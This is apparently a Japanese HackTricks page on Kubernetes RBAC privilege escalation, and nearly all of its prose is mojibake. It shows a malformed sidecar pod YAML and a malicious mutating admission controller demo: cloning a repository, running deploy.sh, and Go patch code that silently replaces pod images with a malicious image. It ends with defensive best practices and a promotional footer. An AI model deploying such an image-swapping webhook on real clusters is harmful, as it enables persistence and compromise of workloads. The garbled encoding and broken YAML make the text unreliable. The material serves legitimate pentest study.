Kubernetesã«ã¯ã€ç‰¹æ¨©æ˜‡æ ¼ã‚’é˜²ããŸã‚ã®[çµ„ã¿è¾¼ã¿ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®ã‚·ã‚¹ãƒ†ãƒ ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå½¹å‰²ã‚„ãƒ­ãƒ¼ãƒ«ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã‚’å¤‰æ›´ã—ã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ã‚’é˜²ã**ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚ã“ã®ãƒ«ãƒ¼ãƒ«ã®å¼·åˆ¶ã¯APIãƒ¬ãƒ™ãƒ«ã§è¡Œã‚ã‚Œã€RBACèªå¯è€…ãŒéã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã§ã‚ã£ã¦ã‚‚ä¿è­·ã‚’æä¾›ã—ã¾ã™ã€‚

ã“ã®ãƒ«ãƒ¼ãƒ«ã§ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ãã®å½¹å‰²ã«å«ã¾ã‚Œã‚‹ã™ã¹ã¦ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã«ã®ã¿ã€å½¹å‰²ã‚’ä½œæˆã¾ãŸã¯æ›´æ–°ã§ãã¾ã™**ã€‚ã•ã‚‰ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ—¢å­˜ã®æ¨©é™ã®ç¯„å›²ã¯ã€ä½œæˆã¾ãŸã¯å¤‰æ›´ã—ã‚ˆã†ã¨ã—ã¦ã„ã‚‹å½¹å‰²ã®ç¯„å›²ã¨ä¸€è‡´ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ClusterRolesã®å ´åˆã¯ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ã€Rolesã®å ´åˆã¯åŒã˜åå‰ç©ºé–“ï¼ˆã¾ãŸã¯ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ï¼‰ã«é™å®šã•ã‚Œã¾ã™ã€‚

{% hint style="warning" %}
å‰è¿°ã®ãƒ«ãƒ¼ãƒ«ã«ã¯ä¾‹å¤–ãŒã‚ã‚Šã¾ã™ã€‚ä¸»ä½“ãŒ**`roles`**ã¾ãŸã¯**`clusterroles`**ã«å¯¾ã—ã¦**`escalate`**å‹•è©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãã®ä¸»ä½“ã¯è‡ªèº«ã«æ¨©é™ãŒãªãã¦ã‚‚ã€å½¹å‰²ã¨ã‚¯ãƒ©ã‚¹ã‚¿ãƒ­ãƒ¼ãƒ«ã®ç‰¹æ¨©ã‚’å¢—ã‚„ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

### **RoleBindings/ClusterRoleBindingsã®å–å¾—ã¨ãƒ‘ãƒƒãƒ**

{% hint style="danger" %}
**ä»¥å‰ã¯ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒæ©Ÿèƒ½ã—ã¦ã„ã¾ã—ãŸãŒã€ç§ã®ãƒ†ã‚¹ãƒˆã«ã‚ˆã‚‹ã¨ã€å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã—ãŸç†ç”±ã¨åŒã˜ç†ç”±ã§ã‚‚ã†æ©Ÿèƒ½ã—ã¦ã„ã¾ã›ã‚“ã€‚æ¨©é™ãŒãªã„å ´åˆã€è‡ªåˆ†è‡ªèº«ã¾ãŸã¯åˆ¥ã®SAã«ç‰¹æ¨©ã‚’ä¸ãˆã‚‹ãŸã‚ã«rolebindingã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚**
{% endhint %}

Rolebindingsã‚’ä½œæˆã™ã‚‹æ¨©é™ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«å½¹å‰²ã‚’ãƒã‚¤ãƒ³ãƒ‰**ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã®æ¨©é™ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç®¡ç†è€…ç‰¹æ¨©ã‚’ä¾µå®³ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãƒã‚¤ãƒ³ãƒ‰ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã€ç‰¹æ¨©æ˜‡æ ¼ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**

## ãã®ä»–ã®æ”»æ’ƒ

### ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ãƒ—ãƒ­ã‚­ã‚·ã‚¢ãƒ—ãƒª

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒãƒƒãƒ‰é–“ã®é€šä¿¡ã«ã¯æš—å·åŒ–ãŒã‚ã‚Šã¾ã›ã‚“ã€‚ç›¸äº’èªè¨¼ã€åŒæ–¹å‘ã€ãƒãƒƒãƒ‰é–“ã€‚

#### ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ãƒ—ãƒ­ã‚­ã‚·ã‚¢ãƒ—ãƒªã‚’ä½œæˆ<a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

ã‚ãªãŸã®.yamlã‚’ä½œæˆã—ã¾ã™ã€‚
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
ç·¨é›†ã—ã¦ã€ã‚³ãƒ¡ãƒ³ãƒˆã‚’å¤–ã—ãŸè¡Œã‚’è¿½åŠ ã—ã¦ãã ã•ã„ã€‚
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
ãƒ—ãƒ­ã‚­ã‚·ã®ãƒ­ã‚°ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š
```bash
kubectl logs app -C proxy
```
è©³ç´°ã¯ã“ã¡ã‚‰ï¼š[https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©

ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒæ°¸ç¶šåŒ–ã•ã‚Œã‚‹å‰ã«Kubernetes APIã‚µãƒ¼ãƒã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ã‚»ãƒ—ãƒˆã—ã¾ã™ãŒã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒèªè¨¼ã•ã‚ŒãŸå¾Œã§ã‚ã‚Šã€ã‹ã¤æ‰¿èªã•ã‚ŒãŸå¾Œã§ã™ã€‚

æ”»æ’ƒè€…ãŒä½•ã‚‰ã‹ã®æ–¹æ³•ã§Mutationg Admission Controllerã‚’ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã§ãã‚Œã°ã€ã™ã§ã«èªè¨¼ã•ã‚ŒãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¤‰æ›´ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ¨©é™æ˜‡æ ¼ãŒå¯èƒ½ã«ãªã‚Šã€é€šå¸¸ã¯ã‚¯ãƒ©ã‚¹ã‚¿ã«æ°¸ç¶šåŒ–ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**ä¾‹** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’ç¢ºèªã—ã¦ã€æº–å‚™ãŒã§ãã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

æ–°ã—ã„ãƒãƒƒãƒ‰ã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã—ã¾ã™ï¼š
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
ä»¥ä¸‹ã®ã‚¯ã‚¨ãƒªã®ã„ãšã‚Œã‹ã§ã‚¤ãƒ¡ãƒ¼ã‚¸åã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚`ErrImagePull`ã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã‚‹å ´åˆã€‚
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

ä¸Šã®ç”»åƒã§è¦‹ã‚‰ã‚Œã‚‹ã‚ˆã†ã«ã€`nginx` ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã—ãŸãŒã€æœ€çµ‚çš„ã«å®Ÿè¡Œã•ã‚ŒãŸã‚¤ãƒ¡ãƒ¼ã‚¸ã¯ `rewanthtammana/malicious-image` ã§ã—ãŸã€‚ä½•ãŒèµ·ã“ã£ãŸã®ã§ã—ã‚‡ã†ã‹ï¼ï¼Ÿ

#### æŠ€è¡“çš„è©³ç´° <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã‚’ç¢ºç«‹ã—ã€ãã®æ§‹æˆè¡Œã«æŒ‡å®šã•ã‚ŒãŸã‚ˆã†ã« Kubernetes API ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¤‰æ›´ã—ã€è¦³å¯Ÿã•ã‚Œã‚‹çµæœã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ã€‚
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹

### **ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®è‡ªå‹•ãƒã‚¦ãƒ³ãƒˆã®ç„¡åŠ¹åŒ–**

- **ãƒãƒƒãƒ‰ã¨ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**: ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒãƒƒãƒ‰ã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒã‚¦ãƒ³ãƒˆã—ã¾ã™ã€‚ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã«ã€Kubernetesã¯ã“ã®è‡ªå‹•ãƒã‚¦ãƒ³ãƒˆæ©Ÿèƒ½ã®ç„¡åŠ¹åŒ–ã‚’è¨±å¯ã—ã¦ã„ã¾ã™ã€‚
- **é©ç”¨æ–¹æ³•**: Kubernetesãƒãƒ¼ã‚¸ãƒ§ãƒ³1.6ä»¥é™ã§ã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¾ãŸã¯ãƒãƒƒãƒ‰ã®æ§‹æˆã§ `automountServiceAccountToken: false` ã‚’è¨­å®šã—ã¾ã™ã€‚

### **RoleBindings/ClusterRoleBindingsã§ã®åˆ¶é™ä»˜ããƒ¦ãƒ¼ã‚¶ãƒ¼å‰²ã‚Šå½“ã¦**

- **é¸æŠçš„ãªã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³**: RoleBindingsã¾ãŸã¯ClusterRoleBindingsã«ã¯å¿…è¦ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ã‚’å«ã‚ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ä¸è¦ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å®šæœŸçš„ã«ç›£æŸ»ã—ã¦å‰Šé™¤ã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã—ã¾ã™ã€‚

### **ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ã®ãƒ­ãƒ¼ãƒ«ã‚ˆã‚Šã‚‚åå‰ç©ºé–“å›ºæœ‰ã®ãƒ­ãƒ¼ãƒ«ã®ä½¿ç”¨**

- **Roles vs. ClusterRoles**: ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ã«é©ç”¨ã•ã‚Œã‚‹ClusterRolesã¨ClusterRoleBindingsã§ã¯ãªãã€åå‰ç©ºé–“å›ºæœ‰ã®æ¨©é™ã«ã¯Rolesã¨RoleBindingsã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã‚ˆã‚Šç´°ã‹ã„åˆ¶å¾¡ã‚’æä¾›ã—ã€æ¨©é™ã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’åˆ¶é™ã—ã¾ã™ã€‚

### **è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ã®ä½¿ç”¨**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **å‚è€ƒæ–‡çŒ®**

- [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
- [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

- **HackTricksã§** **ä¼šç¤¾ã‚’å®£ä¼** **ã—ãŸã„** **ã¾ãŸã¯** **HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰** **ã—ãŸã„å ´åˆã¯** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼**
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com) **ã‚’æ‰‹ã«å…¥ã‚Œã‚‹**
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª** **NFT** **ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³** **ã‚’è¦‹ã¤ã‘ã‚‹**
- **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) **ã«å‚åŠ ã™ã‚‹ã‹ã€** **telegramã‚°ãƒ«ãƒ¼ãƒ—** **ã«å‚åŠ ã™ã‚‹ã‹ã€** **Twitter** **ã§** **@carlospolopm** **ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹**

</details>
